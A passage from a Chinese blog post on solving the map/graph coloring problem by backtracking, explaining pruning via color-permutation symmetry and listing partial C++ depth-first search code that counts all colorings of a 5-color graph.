mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner">…</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05764em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner">…</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner">…</span></span></span></span></span></span>也都为可行解。<br> 即对于已经找到的可行解，可以通过轮换获得更多可行解。由于颜色之间满足<strong>互异性原则</strong>，且解向量中的颜色满足全排列性质。因此确定一个可行解，可映射出<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         A
        
        
         n
        
        
         n
        
       
       
        =
       
       
        n
       
       
        !
       
      
      
       A_n^n=n!
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.93033em;vertical-align: -0.247em"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.664392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.247em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord mathdefault">n</span><span class="mclose">!</span></span></span></span></span>个可行解。通过这个规律可以在短时间内获取巨大数量级的可行解。对于5色，找到一个可行解等于找到<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         A
        
        
         5
        
        
         5
        
       
       
        =
       
       
        5
       
       
        !
       
       
        =
       
       
        120
       
      
      
       A_5^5=5!=120
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.06222em;vertical-align: -0.248108em"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.814108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.248108em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord">5</span><span class="mclose">!</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">1</span><span class="mord">2</span><span class="mord">0</span></span></span></span></span>个可行解；对于<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        15
       
      
      
       15
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">1</span><span class="mord">5</span></span></span></span></span>色，找到一个可行解等于找到<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         A
        
        
         1
        
       
       
        
         5
        
        
         1
        
       
       
        5
       
       
        =
       
       
        15
       
       
        !
       
       
        =
       
       
        1
       
       
        ,
       
       
        307
       
       
        ,
       
       
        674
       
       
        ,
       
       
        368
       
       
        ,
       
       
        000
       
      
      
       A_15^15=15!=1,307,674,368,000
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.964108em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mord">5</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord">1</span><span class="mord">5</span><span class="mclose">!</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.83888em;vertical-align: -0.19444em"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">3</span><span class="mord">0</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">6</span><span class="mord">7</span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">3</span><span class="mord">6</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span></span></span></span></span>个可行解；对于<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        25
       
      
      
       25
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">2</span><span class="mord">5</span></span></span></span></span>色，找到一个可行解等于找到<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         A
        
        
         2
        
       
       
        
         5
        
        
         2
        
       
       
        5
       
       
        =
       
       
        25
       
       
        !
       
       
        =
       
       
        15
       
       
        ,
       
       
        511
       
       
        ,
       
       
        210
       
       
        ,
       
       
        043
       
       
        ,
       
       
        330
       
       
        ,
       
       
        985
       
       
        ,
       
       
        984
       
       
        ,
       
       
        000
       
       
        ,
       
       
        000
       
      
      
       A_25^25=25!=15,511,210,043,330,985,984,000,000
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.964108em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord">5</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord">2</span><span class="mord">5</span><span class="mclose">!</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.83888em;vertical-align: -0.19444em"></span><span class="mord">1</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">5</span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">0</span><span class="mord">4</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">3</span><span class="mord">3</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">9</span><span class="mord">8</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">9</span><span class="mord">8</span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span></span></span></span></span>个可行解。<br> 此外，对于不可行的搜索节点也同理，当找到搜索树的某一枝无解后，可以利用轮换，将所有等效解全部剪枝剪掉，这大大降低了程序的运行时间。</p> 
<h2>
<a id="2_354"></a>2、运行并测试：</h2> 
<p>采用轮换进行剪枝的策略和上面几种已经介绍的剪枝策略，对450点5色地图进行涂色并计时，发现仅需要不到一秒的时间即可完成全部3840个点的搜索，与之前大约一分钟左右的时间相比，算法效率得到极大提升。</p> 
<h1>
<a id="_357"></a>附录：</h1> 
<p>除以上尝试外，我还进行了一些其他的尝试，经过若干种算法的优化，最终可以在<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        60
       
       
        m
       
       
        s
       
      
      
       60ms
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">6</span><span class="mord">0</span><span class="mord mathdefault">m</span><span class="mord mathdefault">s</span></span></span></span></span>内搜出3840个全部可行解，将具体代码附上如下：</p> 
<pre><code class="prism language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token macro property">#<span class="token directive keyword">define</span> COLOR 5    </span><span class="token comment">//颜色数</span>
<span class="token macro property">#<span class="token directive keyword">define</span> VERTEX 90     </span><span class="token comment">//点数</span>
<span class="token macro property">#<span class="token directive keyword">define</span> EDGE 500   </span><span class="token comment">//边数</span>

<span class="token keyword">class</span> <span class="token class-name">Vertex</span> <span class="token punctuation">{<!-- --></span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">int</span> color<span class="token punctuation">;</span>
    <span class="token keyword">int</span> state<span class="token punctuation">[</span>COLOR <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//颜色状态，1为可选，非1为不可选</span>
    <span class="token keyword">int</span> choice<span class="token punctuation">;</span>  <span class="token comment">//可选颜色数，即state中1的数量</span>
    <span class="token keyword">int</span> restrain<span class="token punctuation">;</span>  <span class="token comment">//相邻数量</span>
    <span class="token function">Vertex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        color <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> COLOR <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        choice <span class="token operator">=</span> COLOR<span class="token punctuation">;</span>
        restrain <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>


<span class="token comment">//int map[VERTEX + 1][VERTEX + 1];  //图的邻接矩阵</span>
<span class="token keyword">int</span> map2<span class="token punctuation">[</span>VERTEX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//图的邻接表</span>
<span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">//记录解的个数</span>
<span class="token keyword">long</span> Start<span class="token punctuation">;</span>
<span class="token keyword">long</span> End<span class="token punctuation">;</span>


<span class="token keyword">int</span> <span class="token function">ColorFirst</span><span class="token punctuation">(</span>Vertex <span class="token operator">*</span>S<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">int</span> maxRestrain <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> maxIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> VERTEX<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain <span class="token operator">&gt;</span> maxRestrain<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            maxRestrain <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain<span class="token punctuation">;</span>
            maxIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    S<span class="token punctuation">[</span>maxIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    maxRestrain <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> next <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> map2<span class="token punctuation">[</span>maxIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">int</span> j <span class="token operator">=</span> map2<span class="token punctuation">[</span>maxIndex<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>choice<span class="token operator">--</span><span class="token punctuation">;</span>
        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain<span class="token operator">--</span><span class="token punctuation">;</span>
        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>maxIndex<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain <span class="token operator">&gt;</span> maxRestrain<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            maxRestrain <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain<span class="token punctuation">;</span>
            next <span class="token operator">=</span> j<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> next<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">getNext</span><span class="token punctuation">(</span>Vertex <span class="token operator">*</span>S<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">int</span> min <span class="token operator">=</span> COLOR<span class="token punctuation">;</span>
    <span class="token keyword">int</span> next <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> VERTEX<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>color <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>choice <span class="token operator">==</span> min<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain <span class="token operator">&gt;</span> S<span class="token punctuation">[</span>next<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    min <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>choice<span class="token punctuation">;</span>
                    next <span class="token operator">=</span> i<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>choice <span class="token operator">&lt;</span> min<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                min <span class="token operator">=</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>choice<span class="token punctuation">;</span>
                next <span class="token operator">=</span> i<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> next<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//搜索函数</span>
<span class="token keyword">int</span> <span class="token function">DFS</span><span class="token punctuation">(</span>Vertex <span class="token operator">*</span>S<span class="token punctuation">,</span> <span class="token keyword">int</span> now<span class="token punctuation">,</span> <span class="token keyword">int</span> count<span class="token punctuation">,</span> <span class="token keyword">int</span> used<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> VERTEX<span class="token punctuation">)</span> <span class="token comment">//到达叶子,找到一个着色方案</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token comment">/*End = clock();
        cout &lt;&lt; End - Start &lt;&lt; endl;
        for (int i = 1; i &lt;= VERTEX; i++) //输出该着色方案
            cout &lt;&lt; S[i].color &lt;&lt; " ";
        cout &lt;&lt; endl;
        exit(1);*/</span>

        sum <span class="token operator">+</span><span class="token operator">=</span> S<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">.</span>choice<span class="token punctuation">;</span>

        <span class="token comment">/*if (sum &gt; 1000000000) {
            End = clock();
            cout &lt;&lt; End - Start &lt;&lt; endl;
            exit(1);
        }*/</span>

        <span class="token keyword">return</span> S<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">.</span>choice<span class="token punctuation">;</span>

    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">int</span> s <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> COLOR<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">.</span>state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">int</span> ss <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                S<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">.</span>color <span class="token operator">=</span> i<span class="token punctuation">;</span>
                <span class="token keyword">bool</span> isNew <span class="token operator">=</span> i <span class="token operator">&gt;</span> used<span class="token punctuation">;</span>
                <span class="token comment">//剪枝</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> map2<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">int</span> j <span class="token operator">=</span> map2<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>color <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token comment">/*S[j].state[i] = -now;
                        S[j].choice--;
                        S[j].restrain--;*/</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>choice <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                            <span class="token keyword">goto</span> BACK<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                            S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>now<span class="token punctuation">;</span>
                            S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>choice<span class="token operator">--</span><span class="token punctuation">;</span>
                            S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain<span class="token operator">++</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>isNew<span class="token punctuation">)</span>
                    ss <span class="token operator">=</span> <span class="token function">DFS</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> <span class="token function">getNext</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">,</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> used <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">else</span>
                    ss <span class="token operator">=</span> <span class="token function">DFS</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> <span class="token function">getNext</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">,</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> used<span class="token punctuation">)</span><span class="token punctuation">;</span>

                BACK<span class="token operator">:</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> map2<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">int</span> j <span class="token operator">=</span> map2<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>choice<span class="token operator">++</span><span class="token punctuation">;</span>
                        S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>restrain<span class="token operator">++</span><span class="token punctuation">;</span>
